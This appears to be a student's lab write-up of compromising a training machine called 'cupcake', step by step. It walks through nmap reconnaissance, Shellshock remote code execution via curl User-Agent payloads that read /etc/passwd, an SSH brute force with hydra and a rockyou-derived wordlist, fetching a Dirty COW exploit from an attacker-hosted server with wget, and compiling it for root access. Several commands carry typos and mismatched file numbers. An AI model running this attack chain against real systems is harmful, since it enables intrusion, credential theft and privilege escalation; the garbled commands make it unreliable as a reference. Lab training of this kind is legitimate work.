Exploiting Cupcake
# How you determined the versions of the two services exposed by cupcake
First:
    sudo nmap -A ip address
    sudo nmap -A -v ip address

These scans are both aggressive and give me numerous information about the OS and other key details.
We found out that there are two applications on the system running on ports 22 and 80.
These were OpenSSH and Apache 2.2.15

Second:
    We went to the IP address in a web browser and noticed that it was plain text and not an actual document
    We then performed a wireshark capture and determined that the TTL field was of Liniux origin
    And so we did research and found out that the OS running on this system is CentOS

# How you dealt with parsing nmap result with nmaptocsv

First:
    install python3 and nmaptocsv
    sudo apt install python3-pip
    sudo pip install nmaptocsv

Second:
    Create a target directory and go there
    Then mkdir for the actual target

Third:
    Run an nmap scan:
    sudo nmap --top-ports-100 -Pn 10.0.5.23 -oG 10.0.5.23.logs.100.txt

Fourthly:
    nmaptocsv -i 10.0.5.23.logs.100.txt -d ","
    Copy the output and go to excel
    Paste the data and go down to the clipboard and hit "split text to columns"



# The techniques you used to invoke remote code execution

In order to see the targets running kernel version we used:
sudo nmap -sV -p 80 --scipt http-shellshock --script-args uri=/cgi-bin/status, cmd="echo ; echo ; /bin/uname -a" 10.0.5.23

The contents of /etc/passwd:
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.0.5.23/cgi-bin/status

The code behind the status cgi:
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /var/www/cgi-bin/status' bash -s :'' http://10.0.5.23/cgi-bin/status

The results of ifconfig:
curl -H 'User-Agent: () { :; }; echo ; echo ; /sbin/ifconfig' bash -s :'' http://10.0.5.23/cgi-bin/status




# The generation of a list of passwords and subsequent ssh bruteforce

I zcat the rockyou.txt.gz to my desktop

    sudo zcat rockyou.txt.gz /home/champuser/Desktop/

From there I grep the file for samwise:
    zcat rockyou.txt.gz | grep samwise

I then stored the results in a file but needed it to be case insensitive:
zcat rockyou.txt.gz | grep -i samwise > /home/champuser/Desktop/samwise.txt

That is when I then used hydra to brute force and get in
hydra -l samwise -P /home/champuser/Desktop/samwise.txt 10.0.5.23 -t 4 ssh

The result told me that the login was samwise and password was Samwise123$


# Transfer of files using python and wget

Here we wanted to search for exploits.
    So on our kali box we ran:
        searchsploit Linux-Kernel 2.6
    We then pulled the exploit down using.
        searchsploit -m 40839
    Now we have to create a server on our kali box so that we can copy the file over to sams machine
        python3 -m http.server:8999
    Now on Sams device we will get that that file:
        wget http://ipaddress:port/file
        weget http://10.0.99.103:8999/49839.c



# Compiling and running a privilege escalation exploit (It can be different than the demo!)

First:
    Compile:
        gcc 40839.c -o cow -lpthread -lcrypt
    Running:
        ./cow
         make a password
         and then the user that is created will have root access.